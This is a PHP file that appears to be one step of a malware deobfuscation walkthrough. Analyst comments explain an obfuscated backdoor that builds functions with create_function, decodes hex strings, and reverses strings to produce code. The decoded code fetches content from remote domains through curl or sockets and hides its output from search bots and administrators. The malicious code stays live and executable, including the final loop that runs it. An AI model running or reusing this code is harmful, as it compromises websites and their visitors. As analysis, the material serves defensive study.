<?php
/*
 * We now see a bunch of functions and more hex values
 * So first things first, lets convert all the hex values to see what they do
 */
function oo2($b)
{
    $h = explode("|", strrev($b));
    $d = explode("*", $h[0]);
    $b = $h[1];
    for ($i = 0; $i < sizeof($d); $i++) {
        $b = str_replace($i, $d[$i], $b);
    }
    create_function("", "};" . $b . "//");
}
// So oo2() will create more functions and it looks like it'll append the closing curly braces to a code string

function cqq($qw)
{
    $domarr = array("33db9538", "9507c4e8", "e5b57288", "54dfa1cb");
    return random($domarr, $qw);
}
// Returns some unusual values, no doubt it's important though

function oo1($y)
{
    $y = strrev($y);
    $g = substr($y, strpos($y, "9") + 1);
    $v = explode(":", substr($y, 0, strpos($y, "9")));
    for ($i = 0; $i < sizeof($v); $i++) {
        $q = explode("|", $v[$i]);
        $g = str_replace($q[0], $q[1], $g);
    }
    create_function("", "};" . $g . "//");
}
// This is similar to oo2()

$s1v("", $siv("\71", " ", $slv($svv)));
// The code above is using some of the transposition functions from the previous step
// $s1v = create_function(). But $siv is doing a str_replace to transpose a code string
// So it creates the function below
/*
function en2($s, $q)
{
    $l = "\x73\164\x72\154\x65\156"; // strlen
    $p = "\x70\141\x63\153"; // pack
    $r = "\x73\165\x62\163\x74\162"; // substr
    $m = "\x6d\144\x35"; // md5
    $g = "";
    while ($l($g) < $l($s)) {
        $q = $p("H*", $m($g . $q . "\x71\61\x77\62\x65\63\x72\64")); // q1w2e3r4
        $g.= $r($q, 0, 8);
    }

    return $s ^ $g;
}
*/
// In that case en2() looks like some kind of encoding functionality


function random($arr, $qw)
{
    $g = "\x20\167\x2d\70\x36794587495086f963874,qq-82d94486e,r-86297186e94186d945,wq-874941874,s-87\x33\54\x67\75\x20\167\x2e\40\x72\73\x20\155\x2d\70" . "6d944835,sq-873964872937873960\x38\66\x63\71\x35\61\x38\67\x34\42\x3b";
    $soy = "\x65\156\x32"; // en2
    $xx = "\x65\170\x70" . "\154\x6f\144\x65"; // explode
    $ecx = "\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e"; // create_function
    $scy = "\x73\164\x72\137\x72\145\x70\154\x61\143\x65"; // str_replace
    $a = $xx("|", "\x5c\170\x7c\134\x31\174\x3d\42\x7c\42\x3b\44\x7c\44"); // \x|\1|="|";$|$
    $aa = $xx("|", "8|9|-|,| ");
    $mec = $ecx;
    for ($i = 0; $i < sizeof($a); $i++) {
        $g = $scy($aa[$i], $a[$i], $g);
    }
    $ecx("", "};$g//");
    $mec("", $soy("\230\77\153\147\26\167\114\130\223\257\211\2\253\5\172\316\25\262\145\25\62\72\127\156\270\100\154\56\341\77\4\37\21\152\206\334\101\334\32\210\353\173\253\5\123\231\47\13\20", $scy));
    return $arr[rand((0.24 - (0.03 * 8)), (0.1875 * 6))] . $qw;
    // The calculation here always returns 0 or 1
}
// Not really a "random" function as it houses more obfuscated code and creates functions!

$r9 = explode("|", $n9);
$b9 = 0;
$a9 = 0;
for ($i9 = 0; $i9 < sizeof($r9); $i9++) {
    if ($i9 == 0) $a9 = 0; else $a9 = $r9[$i9 - 1] + $a9;
    $b9 = $r9[$i9];
    $v_[] = substr($v9, $a9, $b9);
}
// The for loop above produces an array $v_ so let's do a print_r() on it and see what we get
/*
    Array
    (
        [0] => 5656}5;Bv5;oc$v5Y5;-4_g@&oc$5;oc$v5Y5;-3_g@&oc$5;oc$v5Y5;-2_g@&oc$5;oc$v5Y5;-1_g@&oc$5;B&oc$5{5-6dtz55}56;%v5;)%6,"n\r\n\r\"(edolpxe&)%6,m$(tsil5;~v5)BV%(6fi5;)J(esolcW@5}5;t$6=.6%5{6))000016,J(daerW&t$(6elihw5;B&%5;)qer$6,J(etirwW5;"n\n\X$6:tsoH"6=.6qer$5;"n\0.1/PTTH6iru$6TEG"&qer$5}5;~v5;)J(esolcW@5{6))086,1pi$6,J(tcennocW@!(6fi5;)PCT_LOS6,MAERTS_KCOS6,TENI_FA(etaercW@&J5;~v5)2pi$6=!61pi$(6fi5;))1pi$(gnol2pi@(pi2gnol@&2pi$5;)X$(emanybXteg@&1pi$5;]"yreuq"[p$6.6"?"6.6]"htap"[p$&iru$5;B=]"yreuq"[p$6))]"yreuq"[p$(tessi!(fi5;]"X"[p$&X$5;-lru_esrap@6=p$5;~v5)~^)"etaercWj4_z55}5;%v5;~v5)BV%(6fi5;)cni$6,B(edolpmi@&%5;-elif@&cni$5;~v5)~^)"elifj3_z5}5;ser$v5;~v5)BVser$(6fi5;)hc$(esolcQ5;)hc$(cexeQ&ser$5;)06,REDAEH+5;)016,TUOEMIT+5;)16,REFSNARTNRUTER+5;)lru$6,LRU+5;)(tiniQ&hc$5;~v5)~^)"tiniQj2_z555}5;%v5;~v5)BV%(6fi5;-Z@&%5;~v5)~^)"Zj1_z59 |6: |5:""|B: == |V:tsoh|X:stnetnoc_teg_elif|Z:kcos$|J:_tekcos|W:_lruc|Q:)lru$(|-:_TPOLRUC ,hc$(tpotes_lruc|+:tpotes_lruc|*: = |&: === |^:fub$|%:eslaf|~: nruter|v:)~ ==! oc$( fi|Y:g noitcnuf|z:"(stsixe_noitcnuf( fi { )lru$(|j
        [1] => }}};eslaf nruter {esle };))8-,i$,ataDzg$(rtsbus(etalfnizg@ nruter };2+i$=i$ )2 & glf$ ( fi ;1+)i$ ,"0\",ataDzg$(soprts=i$ )61 & glf$( fi ;1+)i$,"0\",ataDzg$(soprts=i$ )8 & glf$( fi };nelx$+2+i$=i$ ;))2,i$,ataDzg$(rtsbus,"v"(kcapnu=)nelx$(tsil { )4 & glf$( fi { )0>glf$( fi ;))1,3,ataDzg$(rtsbus(dro=glf$ ;01=i$ { )"80x\b8x\f1x\"==)3,0,ataDzg$(rtsbus( fi { )ataDzg$(izgmoc noitcnuf { ))"izgmoc"(stsixe_noitcnuf!( fi|0
        [2] => } ;1o$~ } ;"" = 1o$Y;]1[1a$ = 1o$ )2=>)1a$(foezis( fi ;)1ac$,"0FN!"(edolpxe@=1a$ ;)po$,)-$(dtg@(2ne=1ac$ ;4g$."/".)"moc."(qqc."//:ptth"=-$ ;)))e&+)d&+)c&+)b&+)a&(edocne-(edocne-."?".po$=4g$ ;)999999,000001(dnar_tm=po$ {Y} ;"" = 1o$ { ) )))a$(rewolotrts ,"i/" . ))"relbmar*xednay*revihcra_ai*tobnsm*pruls*elgoog"(yarra ,"|"(edolpmi . "/"(hctam_gerp( ro )"nimda",)e$(rewolotrts(soprrtsQd$(Qc$(Qa$(( fi ;)"bc1afd45*88275b5e*8e4c7059*8359bd33"(yarra = rramod^FLES_PHP%e^TSOH_PTTH%d^RDDA_ETOMER%c^REREFER_PTTH%b^TNEGA_RESU_PTTH%a$ { )(212yadj } ;a$~ ;W=a$Y;"non"=a$ )""==W( fiY;"non"=a$ ))W(tessi!(fi { )marap$(212kcehcj } ;))po$ ,txet$(2ne(edocne_46esab~ { )txet&j9 esle |Y:]marap$[REVRES_$|W: ro )"non"==|Q:lru|-:.".".|+:","|*:$,po$(43k|&:$ ;)"|^:"(212kcehc=|%: nruter|~: noitcnuf|j
        [3] => }}8zc$9nruter9}817==!9eslaf28)45@9=979{96"5"(stsixe_328164sserpmocnuzg08164izgmoc08164etalfnizg09{9)llun9=9htgnel$9,4oocd939{9))"oocd"(stsixe_3!2| * ;*zd$*) )*edocedzg*zc$(*noitcnuf*( fi*zd$ nruter ) *@ = zd$( ==! eslaf( fi
        [4] => ;)"j"(trats_boU~~~~;t$U&zesleU~;)W%Y%RzesleU~;)W@Y@RU;)v$(oocd=t$U;"54+36Q14+c6Q06+56Q26+".p$=T;"05+36Q46+16Q55+".p$=1p$;"f5Q74+56Q26+07Q"=p$U;)"enonU:gnidocnE-tnetnoC"(redaeHz)v$(jUwz))"j"(stsixe_w!k9 |U:2p$|T:x\|Q:1\|+:nruter|&:lmth|%:ydob|@:} |~: { |z:(fi|k:22ap|j:noitcnuf|w:/\<\(/"(T &z))t$,"is/|Y:/\<\/"(1p$k|R:1,t$ ,"1"."$"."n\".)(212yad ,"is/)>\*]>\^[|W
    )
*/
// True to form this potentially looks like another 5 functions

$y = 1;
for ($i = 0; $i < 5; $i++) {
    $vv1 = "o" . "o" . $y;
    if ($y == 1) $y = 2; else $y = 1;
    $vv1($v_[$i]);
}
// What the above loop is doing is looping through the array and creating 5 functions using oo1() and oo2() functions
// Now if you put a "echo $b" in oo2() and "echo $g" in oo1() you will now see the deobfuscated gibberish in the array above
// Let's go to Step 7-malware-singularity
